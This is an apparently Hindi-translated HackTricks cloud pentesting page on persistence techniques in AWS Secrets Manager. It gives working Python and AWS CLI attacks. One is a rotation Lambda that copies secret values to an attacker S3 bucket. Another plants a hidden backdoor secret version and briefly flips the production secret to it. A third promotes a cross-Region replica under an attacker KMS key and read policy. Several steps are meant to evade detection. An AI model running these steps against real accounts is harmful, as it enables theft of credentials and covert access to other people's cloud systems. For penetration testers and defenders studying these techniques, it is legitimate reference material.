# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Resource Policies के माध्यम से

Resource policies के माध्यम से **grant access to secrets to external accounts** करना संभव है। अधिक जानकारी के लिए [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) देखें। ध्यान दें कि किसी **access a secret** के लिए, external account को उस secret को encrypt करने वाली **need access to the KMS key encrypting the secret** भी होना आवश्यक होगा।

### Secrets Rotate Lambda के माध्यम से

स्वचालित रूप से **rotate secrets** करने के लिए एक configured **Lambda** को कॉल किया जाता है। यदि कोई attacker **change** कर सके **code** को तो वह सीधे **exfiltrate the new secret** खुद को हासिल कर सकता है।

ऐसा lambda code कुछ इस प्रकार दिख सकता है:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
### RotateSecret के माध्यम से rotation Lambda को attacker-controlled function में बदलें

`secretsmanager:RotateSecret` का दुरुपयोग करके secret को attacker-controlled rotation Lambda से फिर से बाँधें और तुरंत rotation ट्रिगर करें। दुर्भावनापूर्ण फ़ंक्शन rotation steps (createSecret/setSecret/testSecret/finishSecret) के दौरान secret versions (AWSCURRENT/AWSPENDING) को attacker sink (उदा., S3 या external HTTP) पर exfiltrates कर लेता है।

- आवश्यकताएँ
- Permissions: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` attacker Lambda पर, `iam:CreateRole/PassRole/PutRolePolicy` (या AttachRolePolicy) ताकि Lambda execution role को provision कर सकें जिसमें `secretsmanager:GetSecretValue` और बेहतर होगा कि `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` हों (ताकि rotation काम करता रहे), secret KMS key के लिए KMS `kms:Decrypt`, और exfiltration के लिए `s3:PutObject` (या outbound egress)।
- एक target secret id (`SecretId`) जिस पर rotation enabled हो या जिसे rotation सक्षम करने की क्षमता हो।

- प्रभाव
- Attacker वैध rotation code को modify किए बिना secret value(s) प्राप्त कर लेता है। केवल rotation configuration को attacker Lambda की ओर बदल दिया जाता है। यदि यह नोटिस न किया गया तो निर्धारित भविष्य के rotations भी attacker के function को invoke करते रहेंगे।

- हमले के चरण (CLI)
1) Prepare attacker sink and Lambda role
- Exfiltration के लिए S3 bucket बनायें और एक execution role बनायें जिसे Lambda ट्रस्ट करे जिसमें secret पढ़ने और S3 में लिखने की permissions हों (साथ में logs/KMS जैसी जरूरतों के लिए अतिरिक्त permissions)।
2) Deploy attacker Lambda जो हर rotation step पर secret value(s) fetch करके S3 पर लिखे। न्यूनतम rotation logic बस AWSCURRENT को AWSPENDING में कॉपी कर सकता है और finishSecret में promote कर सकता है ताकि सर्विस स्वस्थ बनी रहे।
3) Rebind rotation और trigger करें
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) उस secret के लिए S3 prefix को list करके और JSON artifacts का निरीक्षण करके exfiltration verify करें।
5) (Optional) पहचान कम करने के लिए original rotation Lambda को restore करें।

- Example attacker Lambda (Python) जो S3 पर exfiltrate करता है
- Environment: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking for Covert Persistence (custom stage + fast AWSCURRENT flip)

Secrets Manager के version staging labels का दुरुपयोग करके एक attacker-controlled secret version प्लांट करें और इसे एक custom stage (उदाहरण के लिए, `ATTACKER`) के तहत छिपा रखें, जबकि production मौजूदा `AWSCURRENT` का उपयोग जारी रखे। किसी भी समय `AWSCURRENT` को attacker के version पर मूव करके dependent workloads को poison करें, फिर detection कम करने के लिए इसे restore कर दें। यह secret name या rotation config बदले बिना stealthy backdoor persistence और तेज़ time-of-use manipulation की सुविधा देता है।

- आवश्यकताएँ
- Permissions: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (for verification)
- Target secret id in the Region.

- प्रभाव
- एक secret का छिपा हुआ, attacker-controlled version बनाए रखें और मांग पर atomically `AWSCURRENT` उसे flip करें, जिससे वही secret name resolve करने वाले किसी भी consumer पर प्रभाव पड़े। यह flip और त्वरित revert detection की संभावना घटा देते हैं जबकि time-of-use compromise संभव होता है।

- Attack steps (CLI)
- तैयारी
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>CLI commands</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- नोट्स
- जब आप `--client-request-token` प्रदान करते हैं, Secrets Manager इसे `VersionId` के रूप में उपयोग करता है। `--version-stages` को स्पष्ट रूप से सेट किए बिना एक नया संस्करण जोड़ने पर, डिफ़ॉल्ट रूप से `AWSCURRENT` नए संस्करण पर चला जाता है, और पिछले को `AWSPREVIOUS` के रूप में चिन्हित कर देता है।


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Secrets Manager की multi-Region replication का दुरुपयोग करके target secret की एक replica कम-निगरानी वाले Region में बनाई जा सकती है, उस Region में attacker-controlled KMS key से इसे encrypt किया जा सकता है, फिर replica को standalone secret में promote किया जा सकता है और उस पर permissive resource policy लगाकर attacker को read access दिया जा सकता है। primary Region में मूल secret अपरिवर्तित रहता है, जिससे promoted replica के माध्यम से secret value तक एक स्थायी, stealthy पहुंच मिलती है जबकि primary पर KMS/policy प्रतिबंधों को बायपास किया जा सकता है।

- आवश्यकताएँ
- अनुमतियाँ: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- replica Region में: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (या `kms:PutKeyPolicy`) ताकि attacker principal को `kms:Decrypt` की अनुमति दी जा सके।
- promoted secret का read access प्राप्त करने के लिए एक attacker principal (user/role)।

- प्रभाव
- attacker-controlled KMS CMK और permissive resource policy के अंतर्गत एक standalone replica के माध्यम से secret value तक persistent cross-Region access path। original Region में primary secret अपरिवर्तित रहता है।

- हमला (CLI)
- वेरिएबल्स
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) हमलावर द्वारा नियंत्रित KMS key को replica Region में बनाएं
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) attacker KMS key का उपयोग करके secret को R2 में प्रतिलिपि बनाएँ
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) R2 में replica को standalone के रूप में प्रमोट करें
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) R2 में standalone secret पर permissive resource policy लागू करें
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) R2 में attacker principal से secret पढ़ें
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```
{{#include ../../../../banners/hacktricks-training.md}}
